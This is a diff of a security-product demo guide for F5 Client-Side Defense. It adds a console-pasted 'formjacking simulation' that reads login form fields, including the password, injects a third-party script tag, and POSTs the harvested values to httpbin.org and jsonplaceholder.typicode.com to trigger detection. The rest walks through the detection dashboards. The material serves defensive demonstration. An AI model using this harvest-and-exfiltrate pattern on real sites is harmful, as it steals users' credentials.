@@ -7,110 +7,120 @@ sidebar:
 
 import { Aside, Code, Steps } from "@astrojs/starlight/components";
 
-export const triggerScript = `function addAndReadDynamicField() {
-    // Create a container element
-    const wrapper = document.createElement('div');
-    wrapper.style.marginBottom = '10px';
+export const triggerScript = `// CSD Formjacking Simulation — paste into DevTools Console on the login page
+(function() {
+    console.log('[CSD Demo] Starting formjacking simulation...');
 
-    // Generate a unique ID with credit-card-related naming
-    const uniqueId = 'creditdcard-' + Date.now();
-
-    // Create the label
-    const label = document.createElement('label');
-    label.textContent = 'Dynamic Credit User Input: ';
-    label.setAttribute('for', uniqueId);
-    label.style.fontWeight = 'bold';
-    label.style.marginRight = '5px';
-
-    // Create the text field with a dummy value
-    const input = document.createElement('input');
-    input.type = 'text';
-    input.id = uniqueId;
-    input.value = 'Dummy Data ' + Math.floor(Math.random() * 1000);
-    input.className = 'csd-dynamic-field';
-
-    // Append to the DOM
-    wrapper.appendChild(label);
-    wrapper.appendChild(input);
-    document.body.appendChild(wrapper);
-
-    // Read ALL dynamically created fields
-    const allFields = document.querySelectorAll('.csd-dynamic-field');
-    console.log('Currently tracking ' + allFields.length + ' dynamic field(s):');
-    allFields.forEach(function(field, index) {
-        console.log('- Field [' + index + '] ID: ' + field.id + ' | Value: ' + field.value);
+    // Step 1: Harvest existing form fields (CSD tracks fields present at page load)
+    const inputs = document.querySelectorAll('input');
+    const harvested = {};
+    inputs.forEach(function(input) {
+        const name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
     });
-}`;
+    console.log('[CSD Demo] Harvested ' + Object.keys(harvested).length + ' form fields:', harvested);
+
+    // Step 2: Inject a third-party script tag (CSD detects new script domains)
+    var script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js';
+    script.onload = function() {
+        console.log('[CSD Demo] Third-party script loaded from cdn.jsdelivr.net');
+    };
+    document.head.appendChild(script);
+    console.log('[CSD Demo] Injected third-party script tag (cdn.jsdelivr.net)');
+
+    // Step 3: Exfiltrate harvested data to external domains
+    var payload = JSON.stringify(harvested);
+    fetch('https://httpbin.org/post', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo] Data exfiltrated to httpbin.org');
+    });
+    fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo] Data exfiltrated to jsonplaceholder.typicode.com');
+    });
+
+    console.log('[CSD Demo] Simulation complete. Detection takes 5-10 minutes to appear in the CSD console.');
+})();`;
 
 ## Trigger Detection
 
-CSD monitors JavaScript behavior inside the browser. Unlike WAF or Bot Defense, you cannot trigger CSD detection with curl commands — it requires real browser-side script activity. The following script simulates a formjacking attack pattern that CSD is designed to detect.
+CSD monitors JavaScript behavior inside the browser. Unlike WAF or Bot Defense, you cannot trigger CSD detection with curl commands — it requires real browser-side script activity. The following script simulates a formjacking attack by harvesting existing form field values, injecting a third-party script, and exfiltrating data to external domains.
 
 ### Run the Simulation Script
 
 <Steps>
-1. Open the demo application in Chrome
+1. Navigate to the Juice Shop **login page** at `https://botdemo.sales-demo.f5demos.com/#/login`
 
-2. Open DevTools (**F12** → **Console** tab)
+2. Enter dummy credentials into the form fields — type `test@example.com` in the **Email** field and `P@ssword123` in the **Password** field (do not submit the form)
 
-   {/* ![DevTools Console tab](/csd/images/devtools-console.png) */}
+3. Open DevTools (**F12** &rarr; **Console** tab)
 
-3. Paste the following script into the console and press **Enter**
+   ![DevTools Console tab on login page](/csd/images/devtools-console.png)
+
+4. Paste the following script into the console and press **Enter** — it runs automatically as a self-executing function
 
    <Code code={triggerScript} lang="js" title="Formjacking Simulation" />
 
-4. Call the function several times to generate repeated suspicious activity
+5. Observe the `[CSD Demo]` console output confirming each step: field harvesting, script injection, and data exfiltration
 
-   ```js
-   addAndReadDynamicField();
-   addAndReadDynamicField();
-   addAndReadDynamicField();
-   ```
-
-5. Each call dynamically injects a credit-card-named input field into the DOM and reads all injected field values — this is the exact pattern used by formjacking malware to harvest payment data
-
-   {/* ![Console output showing tracked dynamic fields](/csd/images/devtools-console-output.png) */}
-
-6. The injected fields are also visible on the page itself
-
-   {/* ![Injected credit card fields on the demo page](/csd/images/devtools-injected-fields.png) */}
-</Steps>
-
-### Verify on the Dashboard
-
-<Steps>
-1. Navigate to the **Client-Side Defense** dashboard in the XC Console
-
-2. The dashboard summary shows the domain `botdemo.sales-demo.f5demos.com` with status **Action Needed**
-
-   {/* ![CSD Dashboard showing Action Needed for botdemo domain](/csd/images/csd-dashboard.png) */}
-
-3. Click the **...** actions menu on the domain row to see available actions: **Add To Allow List** and **Add To Mitigate List**
-
-   {/* ![Dashboard actions menu](/csd/images/csd-dashboard-actions.png) */}
+   ![Console output after running the simulation script](/csd/images/devtools-console-output.png)
 </Steps>
 
 <Aside type="tip">
-Detection may take a few minutes to appear on the dashboard. If alerts are not yet visible, continue with the dashboard walkthrough below and check back.
+Detection takes **5-10 minutes** to appear on the CSD dashboard. If alerts are not yet visible after running the script, continue with the dashboard walkthrough below and check back.
+</Aside>
+
+### What the Script Does
+
+The simulation replicates the three behaviors CSD is designed to detect:
+
+| Behavior | What the Script Does | What CSD Sees |
+| --- | --- | --- |
+| **Field harvesting** | Reads values from existing `input` elements (email, password) | Scripts reading sensitive form fields |
+| **Script injection** | Appends a `<script>` tag loading lodash from `cdn.jsdelivr.net` | New third-party script domain appearing on the page |
+| **Data exfiltration** | Sends harvested data via `fetch` to `httpbin.org` and `jsonplaceholder.typicode.com` | Network calls to external domains |
+
+<Aside type="note">
+CSD only tracks form fields that exist in the DOM at **page load**. Dynamically created fields are not monitored. This is why the script reads existing fields rather than injecting new ones.
 </Aside>
 
 ## Dashboard
 
-Navigate to the **Client-Side Defense** dashboard. The summary cards show:
+Navigate to the **Client-Side Defense** dashboard in the XC Console.
 
-- **Action Needed** — domains with suspicious activity requiring review
-- **Found &amp; Mitigated** — domains where scripts have been blocked
-- **Found &amp; Allowed** — domains explicitly permitted
-- **Total Found** — all domains detected in the current period
-- **Transactions Consumed** — CSD telemetry events processed this month
+![CSD Dashboard showing summary cards and domain table](/csd/images/csd-dashboard.png)
 
-The domain table lists each monitored domain with its status, last seen timestamp, domain category, and the locations (URLs) where scripts were found.
+The summary cards show **actioned** script domains:
+
+- **Action Needed** — third-party script domains flagged for review but not yet actioned
+- **Found &amp; Mitigated** — domains where scripts have been added to the mitigate list
+- **Found &amp; Allowed** — domains explicitly added to the allow list
+- **Total Found** — all third-party script domains detected in the current period
+- **Transactions Consumed** — CSD telemetry events processed this month (confirms CSD is active)
+
+The domain table lists **third-party script source domains** that have been classified. It does not show the protected application domain itself. Each row shows the domain status, last seen timestamp, domain category, and the locations (URLs) where scripts from that domain were found.
+
+<Aside type="note">
+If no third-party scripts have been actioned yet, the domain table may show "No data found." This is expected — new detections appear in the **Script List** first, and only move to the dashboard domain table after being actioned (allowed or mitigated).
+</Aside>
+
+Click the **...** actions menu on a domain row to see available actions: **Add To Allow List** and **Add To Mitigate List**.
+
+![Dashboard actions menu showing Allow and Mitigate options](/csd/images/csd-dashboard-actions.png)
 
 ## Script Inventory
 
 Open the **Script List** from the left navigation to view all detected scripts.
 
-{/* ![Script List showing high-risk scripts](/csd/images/csd-script-list.png) */}
+![Script List sorted by Risk Level](/csd/images/csd-script-list.png)
 
 | Field | Description |
 | --- | --- |
@@ -123,20 +133,30 @@ Open the **Script List** from the left navigation to view all detected scripts.
 | **Network Interactions** | Count of network calls made by the script |
 | **Form Fields** | Number of form fields the script reads |
 
-After running the simulation, you should see application scripts like `main.js`, `polyfills.js`, and `vendor.js` flagged as **High Risk / Action Needed** with hundreds of network interactions and form field reads detected.
+After running the simulation, you should see:
+
+- **Application scripts** (e.g., `main.js`, `vendor.js`) flagged as **High Risk / Action Needed** because they read sensitive form fields (email, password)
+- **The injected third-party script** (`cdn.jsdelivr.net/npm/lodash...`) appearing as a new entry
 
 <Steps>
 1. Sort by **Risk Level** (High Risk first)
+
 2. Click a high-risk script (e.g., `main.js`) to view its detail page
-3. The **Overview** tab shows a **Script Behaviors Over Time** chart with the risk level, source domain, and type
-4. Click the **Form Fields** tab to see which fields the script is reading
+
+3. The **Overview** tab shows a **Behaviors Over Time** chart tracking the script's risk level, source domain, and type over time
+
+   ![Script detail page showing Behaviors Over Time chart](/csd/images/csd-script-detail.png)
+
+4. Click the **Form Fields** tab to see which specific fields the script is reading
+
+5. Click the **Affected Users** tab to see which users were impacted (see the Affected Users section below)
 </Steps>
 
 ## Form Fields
 
 The **Form Fields** view shows all form fields that CSD detected scripts reading across the monitored site.
 
-{/* ![Form Fields view showing sensitive field detection](/csd/images/csd-form-fields.png) */}
+![Form Fields view with sensitivity classification](/csd/images/csd-form-fields.png)
 
 CSD automatically classifies fields by sensitivity:
 
@@ -144,16 +164,18 @@ CSD automatically classifies fields by sensitivity:
 | --- | --- | --- |
 | **email** | Sensitive (by system) | Login email field — high risk if read by unauthorized scripts |
 | **password** | Sensitive (by system) | Login password field — high risk if read by unauthorized scripts |
-| mat-input-1 | Not Sensitive | Material UI input element |
-| mat-mdc-input-element | Not Sensitive | Material UI component element |
 
-Each field shows the number of associated scripts reading it, locations where reads were observed, and the last read timestamp. You can drill into a field to see exactly which scripts are accessing it.
+<Aside type="note">
+Only fields present in the original page DOM are tracked. The exact field names depend on the Juice Shop Angular form implementation — check the screenshot above for the current field identifiers.
+</Aside>
+
+Each field shows the number of associated scripts reading it, locations where reads were observed, and the last read timestamp. Drill into a field to see exactly which scripts are accessing it.
 
 ## Network
 
-Open the **Network** view to see all domains that scripts are communicating with.
+Open the **Network** view to see all domains that scripts **load from** (not fetch/XHR destinations).
 
-{/* ![Network view showing monitored domains](/csd/images/csd-network-view.png) */}
+![Network All Domains view](/csd/images/csd-network-view.png)
 
 The **All Domains** tab lists each domain with:
 
@@ -161,7 +183,26 @@ The **All Domains** tab lists each domain with:
 - **Domain Category** (e.g., Computer and Internet Info)
 - **Added to Allow/Mitigate List** status (Unlisted, Allowed, or Mitigated)
 
+After running the simulation, `cdn.jsdelivr.net` should appear as a new domain entry because the injected `<script>` tag loaded JavaScript from that domain.
+
 Use the **Mitigate List** and **Allow List** tabs to review domains that have already been actioned.
+
+## Affected Users
+
+The **Affected Users** tab (accessible from a script's detail page) shows users impacted by the selected script.
+
+![Affected Users tab showing impacted users](/csd/images/csd-affected-users.png)
+
+Each entry includes:
+
+| Field | Description |
+| --- | --- |
+| **IP Address** | Source IP of the affected user |
+| **Geolocation** | Country and region derived from the IP |
+| **Browser** | Browser name and version |
+| **Device** | Device type and operating system |
+
+This view demonstrates the scope of a detected attack — how many users were exposed, from which locations, and on which platforms. Use this data to assess the impact of a formjacking incident and prioritize mitigation.
 
 ## Alert Configuration
 
